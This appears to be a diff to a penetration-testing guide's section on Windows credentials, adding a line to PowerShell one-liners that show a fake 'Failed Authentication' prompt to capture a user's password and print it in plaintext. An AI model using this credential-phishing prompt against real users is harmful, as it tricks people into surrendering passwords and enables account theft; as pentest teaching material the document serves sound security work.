@@ -1106,6 +1106,9 @@ You can always **ask the user to enter his credentials of even the credentials o
 ```text
 $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
 $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password
+
+#Get plaintext
+$cred.GetNetworkCredential() | fl
 ```
 
 ### **Possible filenames containing credentials**
